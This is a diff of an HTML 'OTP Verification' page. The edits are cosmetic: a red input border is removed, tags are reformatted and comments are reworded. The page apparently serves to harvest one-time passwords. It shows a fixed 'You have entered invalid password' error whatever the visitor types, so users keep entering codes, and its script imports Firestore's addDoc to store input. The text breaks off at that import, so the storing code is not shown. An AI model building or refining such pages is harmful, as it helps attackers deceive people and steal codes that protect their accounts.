@@ -6,18 +6,13 @@
   <link rel="stylesheet" href="a02b572693328546.css">
   <title>OTP Verification</title>
 
-  <!-- 🔴 ONLY CSS ADDED -->
+  <!-- 🔴 ONLY RED TEXT CSS (NO BORDER) -->
   <style>
     .otp-error {
       color: #d32f2f;
       font-size: 14px;
       margin-top: 6px;
       font-weight: 500;
-    }
-
-    /* Optional: red border to match image */
-    #otp {
-      border: 2px solid #d32f2f;
     }
   </style>
 
@@ -39,11 +34,18 @@
         </p>
 
         <div class="floating-container">
-          <input type="text" id="otp" minlength="6" maxlength="8"
-                 pattern="[0-9]+" inputmode="numeric" required>
+          <input
+            type="text"
+            id="otp"
+            minlength="6"
+            maxlength="8"
+            pattern="[0-9]+"
+            inputmode="numeric"
+            required
+          >
           <label>One-Time Password <span>*</span></label>
 
-          <!-- 🔴 TEXT ALREADY VISIBLE (NO JS) -->
+          <!-- 🔴 TEXT ALREADY VISIBLE -->
           <div class="otp-error">
             You have entered invalid password
           </div>
@@ -72,7 +74,7 @@
     </footer>
   </div>
 
-  <!-- 🔒 JS UNCHANGED -->
+  <!-- 🔒 JS COMPLETELY UNCHANGED -->
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
     import { getFirestore, collection, addDoc } from
